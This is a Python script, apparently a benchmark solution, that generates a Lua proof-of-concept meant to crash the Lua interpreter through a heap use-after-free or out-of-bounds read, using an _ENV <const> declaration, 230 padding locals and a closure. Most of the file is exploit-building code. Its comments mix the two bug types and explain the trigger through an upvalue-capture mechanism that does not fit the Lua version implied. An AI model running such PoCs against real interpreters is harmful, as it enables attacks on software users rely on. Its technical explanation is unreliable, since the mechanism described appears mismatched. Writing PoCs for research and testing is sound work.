import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua.
        The vulnerability occurs when _ENV is declared as <const>, causing the compiler
        to omit upvalue capture instructions. This aligns the subsequent instruction
        (MOVE 0, src) to be interpreted as an upvalue definition, causing an OOB read.
        """
        lines = []
        
        # Define the outer function
        lines.append("local function outer()")
        
        # 'target' will be allocated to Register 0.
        # This is crucial because when 'target = src' is interpreted as an upvalue capture,
        # GETARG_A (target) being 0 means 'islocal=0', i.e., capture an upvalue (not a stack slot).
        lines.append("  local target = nil")
        
        # '_ENV' declared as <const> triggers the compiler bug where it fails to emit
        # the upvalue capture pseudo-instruction for the inner function.
        # It is allocated to Register 1.
        lines.append("  local _ENV <const> = 1")
        
        # Create padding variables to push the register allocation index high.
        # We want 'src' to be at a high index (e.g., > 200) so that when it is interpreted
        # as an upvalue index, it reads out-of-bounds of the outer function's upvalue array.
        padding_count = 230
        padding_vars = [f"v{i}" for i in range(padding_count)]
        
        # Initialize padding variables in chunks to keep line lengths reasonable
        chunk_size = 20
        for i in range(0, padding_count, chunk_size):
            chunk = padding_vars[i:i+chunk_size]
            vars_str = ", ".join(chunk)
            vals_str = ", ".join(["1"] * len(chunk))
            lines.append(f"  local {vars_str} = {vals_str}")
            
        # 'src' will be allocated to a register around 232 (0 + 1 + 230 + 1).
        lines.append("  local src = 1")
        
        # Define the inner function.
        # It references global 'g', which implies access to '_ENV'.
        # Thus, it requires '_ENV' as an upvalue.
        lines.append("  local function inner()")
        lines.append("    return g")
        lines.append("  end")
        
        # The trigger instruction: 'target = src'.
        # Compiles to 'MOVE 0, src_reg'.
        # Due to the bug, the CLOSURE instruction for 'inner' consumes this instruction
        # as its upvalue definition.
        # Interpretation:
        #   islocal = GETARG_A(MOVE) = 0 (since target is reg 0) -> Capture from outer upvalues
        #   index   = GETARG_B(MOVE) = src_reg (~232) -> Access outer->upvals[232]
        # Since 'outer' has only 1 upvalue (_ENV), accessing index 232 is a Heap OOB Read/UAF.
        lines.append("  target = src")
        
        # Call the function to trigger the crash when it accesses the invalid upvalue.
        # Use pcall to prevent the fixed version (which throws a proper error) from crashing.
        lines.append("  pcall(inner)")
        
        lines.append("end")
        
        # Execute the PoC
        lines.append("outer()")
        
        return "\n".join(lines).encode('utf-8')